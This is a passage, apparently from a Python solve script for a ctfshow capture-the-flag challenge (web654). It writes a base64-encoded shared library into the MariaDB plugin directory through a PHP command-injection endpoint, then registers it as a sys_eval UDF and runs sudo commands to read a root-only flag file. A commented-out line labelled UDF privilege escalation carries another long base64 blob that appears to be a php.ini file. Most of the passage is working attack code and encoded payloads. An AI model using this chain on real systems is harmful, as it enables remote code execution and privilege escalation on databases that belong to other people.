AAAAAAAGQSAAAAAAAAZBIAAAAAAACcAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAH0AAAABAAAAAgAAAAAAAAAAEwAAAAAAAAATAAAAAAAAFAIAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACHAAAAAQAAAAMAAAAAAAAAGBUgAAAAAAAYFQAAAAAAABAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAjgAAAAEAAAADAAAAAAAAACgVIAAAAAAAKBUAAAAAAAAQAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAJUAAAABAAAAAwAAAAAAAAA4FSAAAAAAADgVAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACaAAAABgAAAAMAAAAAAAAAQBUgAAAAAABAFQAAAAAAAJABAAAAAAAABAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAowAAAAEAAAADAAAAAAAAANAWIAAAAAAA0BYAAAAAAAAYAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAKgAAAABAAAAAwAAAAAAAADoFiAAAAAAAOgWAAAAAAAAmAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAACxAAAAAQAAAAMAAAAAAAAAgBcgAAAAAACAFwAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAtwAAAAgAAAADAAAAAAAAAIgXIAAAAAAAiBcAAAAAAAAQAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAALwAAAABAAAAAAAAAAAAAAAAAAAAAAAAAIgXAAAAAAAAmwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAjGAAAAAAAAMUAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA" > /tmp/a.so;cat  /tmp/a.so|base64 -d > /usr/lib/mariadb/plugin/b.so`;
'''}
sess.post(url+"1.php",data=data2)
sess.post(url+"1.php",data={'1':'`mysql -uroot -proot -e "create function sys_eval returns string soname \'b.so\'"`;'})
cmd='''mysql -uroot -proot -e "select sys_eval('sudo cat /root/you_win')"'''
cmd=base64.b64encode(cmd.encode()).decode()
datax={'1':'echo `echo {0}|base64 -d|sh`;'.format(cmd)}
# web654
print(re.findall('flag_.*?=ctfshow{.*?}',sess.post(url+"1.php",data=datax).text)[0])

#udf提权
#sess.post(url+"1.php",data={'1':'`echo W1BIUF0KCjs7Ozs7Ozs7Ozs7Ozs7Ozs7OzsKOyBBYm91dCBwaHAuaW5pICAgOwo7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7CjsgUEhQJmFwb3M7cyBpbml0aWFsaXphdGlvbiBmaWxlLCBnZW5lcmFsbHkgY2FsbGVkIHBocC5pbmksIGlzIHJlc3BvbnNpYmxlIGZvcgo7IGNvbmZpZ3VyaW5nIG1hbnkgb2YgdGhlIGFzcGVjdHMgb2YgUEhQJmFwb3M7cyBiZWhhdmlvci4KCjsgUEhQIGF0dGVtcHRzIHRvIGZpbmQgYW5kIGxvYWQgdGhpcyBjb25maWd1cmF0aW9uIGZyb20gYSBudW1iZXIgb2YgbG9jYXRpb25zLgo7IFRoZSBmb2xsb3dpbmcgaXMgYSBzdW1tYXJ5IG9mIGl0cyBzZWFyY2ggb3JkZXI6CjsgMS4gU0FQSSBtb2R1bGUgc3BlY2lmaWMgbG9jYXRpb24uCjsgMi4gVGhlIFBIUFJDIGVudmlyb25tZW50IHZhcmlhYmxlLiAoQXMgb2YgUEhQIDUuMi4wKQo7IDMuIEEgbnVtYmVyIG9mIHByZWRlZmluZWQgcmVnaXN0cnkga2V5cyBvbiBXaW5kb3dzIChBcyBvZiBQSFAgNS4yLjApCjsgNC4gQ3VycmVudCB3b3JraW5nIGRpcmVjdG9yeSAoZXhjZXB0IENMSSkKOyA1LiBUaGUgd2ViIHNlcnZlciZhcG9zO3MgZGlyZWN0b3J5IChmb3IgU0FQSSBtb2R1bGVzKSwgb3IgZGlyZWN0b3J5IG9mIFBIUAo7IChvdGhlcndpc2UgaW4gV2luZG93cykKOyA2LiBUaGUgZGlyZWN0b3J5IGZyb20gdGhlIC0td2l0aC1jb25maWctZmlsZS1wYXRoIGNvbXBpbGUgdGltZSBvcHRpb24sIG9yIHRoZQo7IFdpbmRvd3MgZGlyZWN0b3J5ICh1c3VhbGx5IEM6XHdpbmRvd3MpCjsgU2VlIHRoZSBQSFAgZG9jcyBmb3IgbW9yZSBzcGVjaWZpYyBpbmZvcm1hdGlvbi4KOyBodHRwOi8vcGhwLm5ldC9jb25maWd1cmF0aW9uLmZpbGUKCjsgVGhlIHN5bnRheCBvZiB0aGUgZmlsZSBpcyBleHRyZW1lbHkgc2ltcGxlLiAgV2hpdGVzcGFjZSBhbmQgbGluZXMKOyBiZWdpbm5pbmcgd2l0aCBhIHNlbWljb2xvbiBhcmUgc2lsZW50bHkgaWdub3JlZCAoYXMgeW91IHByb2JhYmx5IGd1ZXNzZWQpLgo7IFNlY3Rpb24gaGVhZGVycyAoZS5nLiBbRm9vXSkgYXJlIGFsc28gc2lsZW50bHkgaWdub3JlZCwgZXZlbiB0aG91Z2gKOyB0aGV5IG1pZ2h0IG1lYW4gc29tZXRoaW5nIGluIHRoZSBmdXR1cmUuCgo7IERpcmVjdGl2ZXMgZm9sbG93aW5nIHRoZSBzZWN0aW9uIGhlYWRpbmcgW1BBVEg9L3d3dy9teXNpdGVdIG9ubHkKOyBhcHBseSB0byBQSFAgZmlsZXMgaW4gdGhlIC93d3cvbXlzaXRlIGRpcmVjdG9yeS4gIERpcmVjdGl2ZXMKOyBmb2xsb3dpbmcgdGhlIHNlY3Rpb24gaGVhZGluZyBbSE9TVD13d3cuZXhhbXBsZS5jb21dIG9ubHkgYXBwbHkgdG8KOyBQSFAgZmlsZXMgc2VydmVkIGZyb20gd3d3LmV4YW1wbGUuY29tLiAgRGlyZWN0aXZlcyBzZXQgaW4gdGhlc2UKOyBzcGVjaWFsIHNlY3Rpb25zIGNhbm5vdCBiZSBvdmVycmlkZGVuIGJ5IHVzZXItZGVmaW5lZCBJTkkgZmlsZXMgb3IKOyBhdCBydW50aW1lLiBDdXJyZW50bHksIFtQQVRIPV0gYW5kIFtIT1NUPV0gc2VjdGlvbnMgb25seSB3b3JrIHVuZGVyCjsgQ0dJL0Zhc3RDR0kuCjsgaHR0cDovL3BocC5uZXQvaW5pLnNlY3Rpb25zCgo7IERpcmVjdGl2ZXMgYXJlIHNwZWNpZmllZCB1c2luZyB0aGUgZm9sbG93aW5nIHN5bnRheDoKOyBkaXJlY3RpdmUgPSB2YWx1ZQo7IERpcmVjdGl2ZSBuYW1lcyBhcmUgKmNhc2Ugc2Vuc2l0aXZlKiAtIGZvbz1iYXIgaXMgZGlmZmVyZW50IGZyb20gRk9PPWJhci4KOyBEaXJlY3RpdmVzIGFyZSB2YXJpYWJsZXMgdXNlZCB0byBjb25maWd1cmUgUEhQIG9yIFBIUCBleHRlbnNpb25zLgo7IFRoZXJlIGlzIG5vIG5hbWUgdmFsaWRhdGlvbi4gIElmIFBIUCBjYW4mYXBvczt0IGZpbmQgYW4gZXhwZWN0ZWQKOyBkaXJlY3RpdmUgYmVjYXVzZSBpdCBpcyBub3Qgc2V0IG9yIGlzIG1pc3R5cGVkLCBhIGRlZmF1bHQgdmFsdWUgd2lsbCBiZSB1c2VkLgoKOyBUaGUgdmFsdWUgY2FuIGJlIGEgc3RyaW5nLCBhIG51bWJlciwgYSBQSFAgY29uc3RhbnQgKGUuZy4gRV9BTEwgb3IgTV9QSSksIG9uZQo7IG9mIHRoZSBJTkkgY29uc3RhbnRzIChPbiwgT2ZmLCBUcnVlLCBGYWxzZSwgWWVzLCBObyBhbmQgTm9uZSkgb3IgYW4gZXhwcmVzc2lvbgo7IChlLmcuIEVfQUxMICZhbXA7IH5FX05PVElDRSksIGEgcXVvdGVkIHN0cmluZyAoJnF1b3Q7YmFyJnF1b3Q7KSwgb3IgYSByZWZlcmVuY2UgdG8gYQo7IHByZXZpb3VzbHkgc2V0IHZhcmlhYmxlIG9yIGRpcmVjdGl2ZSAoZS5nLiAke2Zvb30pCgo7IEV4cHJlc3Npb25zIGluIHRoZSBJTkkgZmlsZSBhcmUgbGltaXRlZCB0byBiaXR3aXNlIG9wZXJhdG9ycyBhbmQgcGFyZW50aGVzZXM6CjsgfCAgYml0d2lzZSBPUgo7IF4gIGJpdHdpc2UgWE9SCjsgJmFtcDsgIGJpdHdpc2UgQU5ECjsgfiAgYml0d2lzZSBOT1QKOyAhICBib29sZWFuIE5PVAoKOyBCb29sZWFuIGZsYWdzIGNhbiBiZSB0dXJuZWQgb24gdXNpbmcgdGhlIHZhbHVlcyAxLCBPbiwgVHJ1ZSBvciBZZXMuCjsgVGhleSBjYW4gYmUgdHVybmVkIG9mZiB1c2luZyB0aGUgdmFsdWVzIDAsIE9mZiwgRmFsc2Ugb3IgTm8uCgo7IEFuIGVtcHR5IHN0cmluZyBjYW4gYmUgZGVub3RlZCBieSBzaW1wbHkgbm90IHdyaXRpbmcgYW55dGhpbmcgYWZ0ZXIgdGhlIGVxdWFsCjsgc2lnbiwgb3IgYnkgdXNpbmcgdGhlIE5vbmUga2V5d29yZDoKCjsgZm9vID0gICAgICAgICA7IHNldHMgZm9vIHRvIGFuIGVtcHR5IHN0cmluZwo7IGZvbyA9IE5vbmUgICAgOyBzZXRzIGZvbyB0byBhbiBlbXB0eSBzdHJpbmcKOyBmb28gPSAmcXVvdDtOb25lJnF1b3Q7ICA7IHNldHMgZm9vIHRvIHRoZSBzdHJpbmcgJmFwb3M7Tm9uZSZhcG9zOwoKOyBJZiB5b3UgdXNlIGNvbnN0YW50cyBpbiB5b3VyIHZhbHVlLCBhbmQgdGhlc2UgY29uc3RhbnRzIGJlbG9uZyB0byBhCjsgZHluYW1pY2FsbHkgbG9hZGVkIGV4dGVuc2lvbiAoZWl0aGVyIGEgUEhQIGV4dGVuc2lvbiBvciBhIFplbmQgZXh0ZW5zaW9uKSwKOyB5b3UgbWF5IG9ubHkgdXNlIHRoZXNlIGNvbnN0YW50cyAqYWZ0ZXIqIHRoZSBsaW5lIHRoYXQgbG9hZHMgdGhlIGV4dGVuc2lvbi4KCjs7Ozs7Ozs7Ozs7Ozs7Ozs7OzsKOyBBYm91dCB0aGlzIGZpbGUgOwo7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7CjsgUEhQIGNvbWVzIHBhY2thZ2VkIHdpdGggdHdvIElOSSBmaWxlcy4gT25lIHRoYXQgaXMgcmVjb21tZW5kZWQgdG8gYmUgdXNlZAo7IGluIHByb2R1Y3Rpb24gZW52aXJvbm1lbnRzIGFuZCBvbmUgdGhhdCBpcyByZWNvbW1lbmRlZCB0byBiZSB1c2VkIGluCjsgZGV2ZWxvcG1lbnQgZW52aXJvbm1lbnRzLgoKOyBwaHAuaW5pLXByb2R1Y3Rpb24gY29udGFpbnMgc2V0dGluZ3Mgd2hpY2ggaG9sZCBzZWN1cml0eSwgcGVyZm9ybWFuY2UgYW5kCjsgYmVzdCBwcmFjdGljZXMgYXQgaXRzIGNvcmUuIEJ1dCBwbGVhc2UgYmUgYXdhcmUsIHRoZXNlIHNldHRpbmdzIG1heSBicmVhawo7IGNvbXBhdGliaWxpdHkgd2l0aCBvbGRlciBvciBsZXNzIHNlY3VyaXR5IGNvbnNjaWVuY2UgYXBwbGljYXRpb25zLiBXZQo7IHJlY29tbWVuZGluZyB1c2luZyB0aGUgcHJvZHVjdGlvbiBpbmkgaW4gcHJvZHVjdGlvbiBhbmQgdGVzdGluZyBlbnZpcm9ubWVudHMuCgo7IHBocC5pbmktZGV2ZWxvcG1lbnQgaXMgdmVyeSBzaW1pbGFyIHRvIGl0cyBwcm9kdWN0aW9uIHZhcmlhbnQsIGV4Y2VwdCBpdCBpcwo7IG11Y2ggbW9yZSB2ZXJib3NlIHdoZW4gaXQgY29tZXMgdG8gZXJyb3JzLiBXZSByZWNvbW1lbmQgdXNpbmcgdGhlCjsgZGV2ZWxvcG1lbnQgdmVyc2lvbiBvbmx5IGluIGRldmVsb3BtZW50IGVudmlyb25tZW50cywgYXMgZXJyb3JzIHNob3duIHRvCjsgYXBwbGljYXRpb24gdXNlcnMgY2FuIGluYWR2ZXJ0ZW50bHkgbGVhayBvdGhlcndpc2Ugc2VjdXJlIGluZm9ybWF0aW9uLgoKOyBUaGlzIGlzIHRoZSBwaHAuaW5pLWRldmVsb3BtZW50IElOSSBmaWxlLgoKOzs7Ozs7Ozs7Ozs7Ozs7Ozs7Owo7IFF1aWNrIFJlZmVyZW5jZSA7Cjs7Ozs7Ozs7Ozs7Ozs7Ozs7OzsKOyBUaGUgZm9sbG93aW5nIGFyZSBhbGwgdGhlIHNldHRpbmdzIHdoaWNoIGFyZSBkaWZmZXJlbnQgaW4gZWl0aGVyIHRoZSBwcm9kdWN0aW9uCjsgb3IgZGV2ZWxvcG1lbnQgdmVyc2lvbnMgb2YgdGhlIElOSXMgd2l0aCByZXNwZWN0IHRvIFBIUCZhcG9zO3MgZGVmYXVsdCBiZWhhdmlvci4KOyBQbGVhc2Ugc2VlIHRoZSBhY3R1YWwgc2V0dGluZ3MgbGF0ZXIgaW4gdGhlIGRvY3VtZW50IGZvciBtb3JlIGRldGFpbHMgYXMgdG8gd2h5Cjsgd2UgcmVjb21tZW5kIHRoZXNlIGNoYW5nZXMgaW4gUEhQJmFwb3M7cyBiZWhhdmlvci4KCjsgZGlzcGxheV9lcnJvcnMKOyAgIERlZmF1bHQgVmFsdWU6IE9uCjsgICBEZXZlbG9wbWVudCBWYWx1ZTogT24KOyAgIFByb2R1Y3Rpb24gVmFsdWU6IE9mZgoKOyBkaXNwbGF5X3N0YXJ0dXBfZXJyb3JzCjsgICBEZWZhdWx0IFZhbHVlOiBPZmYKOyAgIERldmVsb3BtZW50IFZhbHVlOiBPbgo7ICAgUHJvZHVjdGlvbiBWYWx1ZTogT2ZmCgo7IGVycm9yX3JlcG9ydGluZwo7ICAgRGVmYXVsdCBWYWx1ZTogRV9BTEwgJmFtcDsgfkVfTk9USUNFICZhbXA7IH5FX1NUUklDVCAmYW1wOyB+RV9ERVBSRUNBVEVECjsgICBEZXZlbG9wbWVudCBWYWx1ZTogRV9BTEwKOyAgIFByb2R1Y3Rpb24gVmFsdWU6IEVfQUxMICZhbXA7IH5FX0RFUFJFQ0FURUQgJmFtcDsgfkVfU1RSSUNUCgo7IGh0bWxfZXJyb3JzCjsgICBEZWZhdWx0IFZhbHVlOiBPbgo7ICAgRGV2ZWxvcG1lbnQgVmFsdWU6IE9uCjsgICBQcm9kdWN0aW9uIHZhbHVlOiBPbgoKOyBsb2dfZXJyb3JzCjsgICBEZWZhdWx0IFZhbHVlOiBPZmYKOyAgIERldmVsb3BtZW50IFZhbHVlOiBPbgo7ICAgUHJvZHVjdGlvbiBWYWx1ZTogT24KCjsgbWF4X2lucHV0X3RpbWUKOyAgIERlZmF1bHQgVmFsdWU6IC0xIChVbmxpbWl0ZWQpCjsgICBEZXZlbG9wbWVudCBWYWx1ZTogNjAgKDYwIHNlY29uZHMpCjsgICBQcm9kdWN0aW9uIFZhbHVlOiA2MCAoNjAgc2Vjb25kcykKCjsgb3V0cHV0X2J1ZmZlcmluZwo7ICAgRGVmYXVsdCBWYWx1ZTogT2ZmCjsgICBEZXZlbG9wbWVudCBWYWx1ZTogNDA5Ngo7ICAgUHJvZHVjdGlvbiBWYWx1ZTogNDA5NgoKOyByZWdpc3Rlcl9hcmdjX2FyZ3YKOyAgIERlZmF1bHQgVmFsdWU6IE9uCjsgICBEZXZlbG9wbWVudCBWYWx1ZTogT2ZmCjsgICBQcm9kdWN0aW9uIFZhbHVlOiBPZmYKCjsgcmVxdWVzdF9vcmRlcgo7ICAgRGVmYXVsdCBWYWx1ZTogTm9uZQo7ICAgRGV2ZWxvcG1lbnQgVmFsdWU6ICZxdW90O0dQJnF1b3Q7CjsgICBQcm9kdWN0aW9uIFZhbHVlOiAmcXVvdDtHUCZxdW90OwoKOyBzZXNzaW9uLmdjX2Rpdmlzb3IKOyAgIERlZmF1bHQgVmFsdWU6IDEwMAo7ICAgRGV2ZWxvcG1lbnQgVmFsdWU6IDEwMDAKOyAgIFByb2R1Y3Rpb24gVmFsdWU6IDEwMDAKCjsgc2Vzc2lvbi5zaWRfYml0c19wZXJfY2hhcmFjdGVyCjsgICBEZWZhdWx0IFZhbHVlOiA0CjsgICBEZXZlbG9wbWVudCBWYWx1ZTogNQo7ICAgUHJvZHVjdGlvbiBWYWx1ZTogNQoKOyBzaG9ydF9vcGVuX3RhZwo7ICAgRGVmYXVsdCBWYWx1ZTogT24KOyAgIERldmVsb3BtZW50IFZhbHVlOiBPZmYKOyAgIFByb2R1Y3Rpb24gVmFsdWU6IE9mZgoKOyB2YXJpYWJsZXNfb3JkZXIKOyAgIERlZmF1bHQgVmFsdWU6ICZxdW90O0VHUENTJnF1b3Q7CjsgICBEZXZlbG9wbWVudCBWYWx1ZTogJnF1b3Q7R1BDUyZxdW90Owo7ICAgUHJvZHVjdGlvbiBWYWx1ZTogJnF1b3Q7R1BDUyZxdW90OwoKOzs7Ozs7Ozs7Ozs7Ozs7Ozs7OzsKOyBwaHAuaW5pIE9wdGlvbnMgIDsKOzs7Ozs7Ozs7Ozs7Ozs7Ozs7OzsKOyBOYW1lIGZvciB1c2VyLWRlZmluZWQgcGhwLmluaSAoLmh0YWNjZXNzKSBmaWxlcy4gRGVmYXVsdCBpcyAmcXVvdDsudXNlci5pbmkmcXVvdDsKO3VzZXJfaW5pLmZpbGVuYW1lID0gJnF1b3Q7LnVzZXIuaW5pJnF1b3Q7Cgo7IFRvIGRpc2FibGUgdGhpcyBmZWF0dXJlIHNldCB0aGlzIG9wdGlvbiB0byBhbiBlbXB0eSB2YWx1ZQo7dXNlcl9pbmkuZmlsZW5hbWUgPQoKOyBUVEwgZm9yIHVzZXItZGVmaW5lZCBwaHAuaW5pIGZpbGVzICh0aW1lLXRvLWxpdmUpIGluIHNlY29uZHMuIERlZmF1bHQgaXMgMzAwIHNlY29uZHMgKDUgbWludXRlcykKO3VzZXJfaW5pLmNhY2hlX3R0bCA9IDMwMAoKOzs7Ozs7Ozs7Ozs7Ozs7Ozs7OzsKOyBMYW5ndWFnZSBPcHRpb25zIDsKOzs7Ozs7Ozs7Ozs7Ozs7Ozs7OzsKCjsgRW5hYmxlIHRoZSBQSFAgc2NyaXB0aW5nIGxhbmd1YWdlIGVuZ2luZSB1bmRlciBBcGFjaGUuCjsgaHR0cDovL3BocC5uZXQvZW5naW5lCmVuZ2luZSA9IE9uCgo7IFRoaXMgZGlyZWN0aXZlIGRldGVybWluZXMgd2hldGhlciBvciBub3QgUEhQIHdpbGwgcmVjb2duaXplIGNvZGUgYmV0d2Vlbgo7ICZsdDs/IGFuZCA/Jmd0OyB0YWdzIGFzIFBIUCBzb3VyY2Ugd2hpY2ggc2hvdWxkIGJlIHByb2Nlc3NlZCBhcyBzdWNoLiBJdCBpcwo7IGdlbmVyYWxseSByZWNvbW1lbmRlZCB0aGF0ICZsdDs/cGhwIGFuZCA/Jmd0OyBzaG91bGQgYmUgdXNlZCBhbmQgdGhhdCB0aGlzIGZlYXR1cmUKOyBzaG91bGQgYmUgZGlzYWJsZWQsIGFzIGVuYWJsaW5nIGl0IG1heSByZXN1bHQgaW4gaXNzdWVzIHdoZW4gZ2VuZXJhdGluZyBYTUwKOyBkb2N1bWVudHMsIGhvd2V2ZXIgdGhpcyByZW1haW5zIHN1cHBvcnRlZCBmb3IgYmFja3dhcmQgY29tcGF0aWJpbGl0eSByZWFzb25zLgo7IE5vdGUgdGhhdCB0aGlzIGRpcmVjdGl2ZSBkb2VzIG5vdCBjb250cm9sIHRoZSAmbHQ7Pz0gc2hvcnRoYW5kIHRhZywgd2hpY2ggY2FuIGJlCjsgdXNlZCByZWdhcmRsZXNzIG9mIHRoaXMgZGlyZWN0aXZlLgo7IERlZmF1bHQgVmFsdWU6IE9uCjsgRGV2ZWxvcG1lbnQgVmFsdWU6IE9mZgo7IFByb2R1Y3Rpb24gVmFsdWU6IE9mZgo7IGh0dHA6Ly9waHAubmV0L3Nob3J0LW9wZW4tdGFnCnNob3J0X29wZW5fdGFnID0gT2ZmCgo7IFRoZSBudW1iZXIgb2Ygc2lnbmlmaWNhbnQgZGlnaXRzIGRpc3BsYXllZCBpbiBmbG9hdGluZyBwb2ludCBudW1iZXJzLgo7IGh0dHA6Ly9waHAubmV0L3ByZWNpc2lvbgpwcmVjaXNpb24gPSAxNAoKOyBPdXRwdXQgYnVmZmVyaW5nIGlzIGEgbWVjaGFuaXNtIGZvciBjb250cm9sbGluZyBob3cgbXVjaCBvdXRwdXQgZGF0YQo7IChleGNsdWRpbmcgaGVhZGVycyBhbmQgY29va2llcykgUEhQIHNob3VsZCBrZWVwIGludGVybmFsbHkgYmVmb3JlIHB1c2hpbmcgdGhhdAo7IGRhdGEgdG8gdGhlIGNsaWVudC4gSWYgeW91ciBhcHBsaWNhdGlvbiZhcG9zO3Mgb3V0cHV0IGV4Y2VlZHMgdGhpcyBzZXR0aW5nLCBQSFAKOyB3aWxsIHNlbmQgdGhhdCBkYXRhIGluIGNodW5rcyBvZiByb3VnaGx5IHRoZSBzaXplIHlvdSBzcGVjaWZ5Lgo7IFR1cm5pbmcgb24gdGhpcyBzZXR0aW5nIGFuZCBtYW5hZ2luZyBpdHMgbWF4aW11bSBidWZmZXIgc2l6ZSBjYW4geWllbGQgc29tZQo7IGludGVyZXN0aW5nIHNpZGUtZWZmZWN0cyBkZXBlbmRpbmcgb24geW91ciBhcHBsaWNhdGlvbiBhbmQgd2ViIHNlcnZlci4KOyBZb3UgbWF5IGJlIGFibGUgdG8gc2VuZCBoZWFkZXJzIGFuZCBjb29raWVzIGFmdGVyIHlvdSZhcG9zO3ZlIGFscmVhZHkgc2VudCBvdXRwdXQKOyB0aHJvdWdoIHByaW50IG9yIGVjaG8uIFlvdSBhbHNvIG1heSBzZWUgcGVyZm9ybWFuY2UgYmVuZWZpdHMgaWYgeW91ciBzZXJ2ZXIgaXMKOyBlbWl0dGluZyBsZXNzIHBhY2tldHMgZHVlIHRvIGJ1ZmZlcmVkIG91dHB1dCB2ZXJzdXMgUEhQIHN0cmVhbWluZyB0aGUgb3V0cHV0CjsgYXMgaXQgZ2V0cyBpdC4gT24gcHJvZHVjdGlvbiBzZXJ2ZXJzLCA0MDk2IGJ5dGVzIGlzIGEgZ29vZCBzZXR0aW5nIGZvciBwZXJmb3JtYW5jZQo7IHJlYXNvbnMuCjsgTm90ZTogT3V0cHV0IGJ1ZmZlcmluZyBjYW4gYWxzbyBiZSBjb250cm9sbGVkIHZpYSBPdXRwdXQgQnVmZmVyaW5nIENvbnRyb2wKOyAgIGZ1bmN0aW9ucy4KOyBQb3NzaWJsZSBWYWx1ZXM6CjsgICBPbiA9IEVuYWJsZWQgYW5kIGJ1ZmZlciBpcyB1bmxpbWl0ZWQuIChVc2Ugd2l0aCBjYXV0aW9uKQo7ICAgT2ZmID0gRGlzYWJsZWQKOyAgIEludGVnZXIgPSBFbmFibGVzIHRoZSBidWZmZXIgYW5kIHNldHMgaXRzIG1heGltdW0gc2l6ZSBpbiBieXRlcy4KOyBOb3RlOiBUaGlzIGRpcmVjdGl2ZSBpcyBoYXJkY29kZWQgdG8gT2ZmIGZvciB0aGUgQ0xJIFNBUEkKOyBEZWZhdWx0IFZhbHVlOiBPZmYKOyBEZXZlbG9wbWVudCBWYWx1ZTogNDA5Ngo7IFByb2R1Y3Rpb24gVmFsdWU6IDQwOTYKOyBodHRwOi8vcGhwLm5ldC9vdXRwdXQtYnVmZmVyaW5nCm91dHB1dF9idWZmZXJpbmcgPSA0MDk2Cgo7IFlvdSBjYW4gcmVkaXJlY3QgYWxsIG9mIHRoZSBvdXRwdXQgb2YgeW91ciBzY3JpcHRzIHRvIGEgZnVuY3Rpb24uICBGb3IKOyBleGFtcGxlLCBpZiB5b3Ugc2V0IG91dHB1dF9oYW5kbGVyIHRvICZxdW90O21iX291dHB1dF9oYW5kbGVyJnF1b3Q7LCBjaGFyYWN0ZXIKOyBlbmNvZGluZyB3aWxsIGJlIHRyYW5zcGFyZW50bHkgY29udmVydGVkIHRvIHRoZSBzcGVjaWZpZWQgZW5jb2RpbmcuCjsgU2V0dGluZyBhbnkgb3V0cHV0IGhhbmRsZXIgYXV0b21hdGljYWxseSB0dXJucyBvbiBvdXRwdXQgYnVmZmVyaW5nLgo7IE5vdGU6IFBlb3BsZSB3aG8gd3JvdGUgcG9ydGFibGUgc2NyaXB0cyBzaG91bGQgbm90IGRlcGVuZCBvbiB0aGlzIGluaQo7ICAgZGlyZWN0aXZlLiBJbnN0ZWFkLCBleHBsaWNpdGx5IHNldCB0aGUgb3V0cHV0IGhhbmRsZXIgdXNpbmcgb2Jfc3RhcnQoKS4KOyAgIFVzaW5nIHRoaXMgaW5pIGRpcmVjdGl2ZSBtYXkgY2F1c2UgcHJvYmxlbXMgdW5sZXNzIHlvdSBrbm93IHdoYXQgc2NyaXB0CjsgICBpcyBkb2luZy4KOyBOb3RlOiBZb3UgY2Fubm90IHVzZSBib3RoICZxdW90O21iX291dHB1dF9oYW5kbGVyJnF1b3Q7IHdpdGggJnF1b3Q7b2JfaWNvbnZfaGFuZGxlciZxdW90Owo7ICAgYW5kIHlvdSBjYW5ub3QgdXNlIGJvdGggJnF1b3Q7b2JfZ3poYW5kbGVyJnF1b3Q7IGFuZCAmcXVvdDt6bGliLm91dHB1dF9jb21wcmVzc2lvbiZxdW90Oy4KOyBOb3RlOiBvdXRwdXRfaGFuZGxlciBtdXN0IGJlIGVtcHR5IGlmIHRoaXMgaXMgc2V0ICZhcG9zO09uJmFwb3M7ICEhISEKOyAgIEluc3RlYWQgeW91IG11c3QgdXNlIHpsaWIub3V0cHV0X2hhbmRsZXIuCjsgaHR0cDovL3BocC5uZXQvb3V0cHV0LWhhbmRsZXIKO291dHB1dF9oYW5kbGVyID0KCjsgVVJMIHJld3JpdGVyIGZ1bmN0aW9uIHJld3JpdGVzIFVSTCBvbiB0aGUgZmx5IGJ5IHVzaW5nCjsgb3V0cHV0IGJ1ZmZlci4gWW91IGNhbiBzZXQgdGFyZ2V0IHRhZ3MgYnkgdGhpcyBjb25maWd1cmF0aW9uLgo7ICZxdW90O2Zvcm0mcXVvdDsgdGFnIGlzIHNwZWNpYWwgdGFnLiBJdCB3aWxsIGFkZCBoaWRkZW4gaW5wdXQgdGFnIHRvIHBhc3MgdmFsdWVzLgo7IFJlZmVyIHRvIHNlc3Npb24udHJhbnNfc2lkX3RhZ3MgZm9yIHVzYWdlLgo7IERlZmF1bHQgVmFsdWU6ICZxdW90O2Zvcm09JnF1b3Q7CjsgRGV2ZWxvcG1lbnQgVmFsdWU6ICZxdW90O2Zvcm09JnF1b3Q7CjsgUHJvZHVjdGlvbiBWYWx1ZTogJnF1b3Q7Zm9ybT0mcXVvdDsKO3VybF9yZXdyaXRlci50YWdzCgo7IFVSTCByZXdyaXRlciB3aWxsIG5vdCByZXdyaXRlIGFic29sdXRlIFVSTCBub3IgZm9ybSBieSBkZWZhdWx0LiBUbyBlbmFibGUKOyBhYnNvbHV0ZSBVUkwgcmV3cml0ZSwgYWxsb3dlZCBob3N0cyBtdXN0IGJlIGRlZmluZWQgYXQgUlVOVElNRS4KOyBSZWZlciB0byBzZXNzaW9uLnRyYW5zX3NpZF9ob3N0cyBmb3IgbW9yZSBkZXRhaWxzLgo7IERlZmF1bHQgVmFsdWU6ICZxdW90OyZxdW90Owo7IERldmVsb3BtZW50IFZhbHVlOiAmcXVvdDsmcXVvdDsKOyBQcm9kdWN0aW9uIFZhbHVlOiAmcXVvdDsmcXVvdDsKO3VybF9yZXdyaXRlci5ob3N0cwoKOyBUcmFuc3BhcmVudCBvdXRwdXQgY29tcHJlc3Npb24gdXNpbmcgdGhlIHpsaWIgbGlicmFyeQo7IFZhbGlkIHZhbHVlcyBmb3IgdGhpcyBvcHRpb24gYXJlICZhcG9zO29mZiZhcG9zOywgJmFwb3M7b24mYXBvczssIG9yIGEgc3BlY2lmaWMgYnVmZmVyIHNpemUKOyB0byBiZSB1c2VkIGZvciBjb21wcmVzc2lvbiAoZGVmYXVsdCBpcyA0S0IpCjsgTm90ZTogUmVzdWx0aW5nIGNodW5rIHNpemUgbWF5IHZhcnkgZHVlIHRvIG5hdHVyZSBvZiBjb21wcmVzc2lvbi4gUEhQCjsgICBvdXRwdXRzIGNodW5rcyB0aGF0IGFyZSBmZXcgaHVuZHJlZHMgYnl0ZXMgZWFjaCBhcyBhIHJlc3VsdCBvZgo7ICAgY29tcHJlc3Npb24uIElmIHlvdSBwcmVmZXIgYSBsYXJnZXIgY2h1bmsgc2l6ZSBmb3IgYmV0dGVyCjsgICBwZXJmb3JtYW5jZSwgZW5hYmxlIG91dHB1dF9idWZmZXJpbmcgaW4gYWRkaXRpb24uCjsgTm90ZTogWW91IG5lZWQgdG8gdXNlIHpsaWIub3V0cHV0X2hhbmRsZXIgaW5zdGVhZCBvZiB0aGUgc3RhbmRhcmQKOyAgIG91dHB1dF9oYW5kbGVyLCBvciBvdGhlcndpc2UgdGhlIG91dHB1dCB3aWxsIGJlIGNvcnJ1cHRlZC4KOyBodHRwOi8vcGhwLm5ldC96bGliLm91dHB1dC1jb21wcmVzc2lvbgp6bGliLm91dHB1dF9jb21wcmVzc2lvbiA9IE9mZgoKOyBodHRwOi8vcGhwLm5ldC96bGliLm91dHB1dC1jb21wcmVzc2lvbi1sZXZlbAo7emxpYi5vdXRw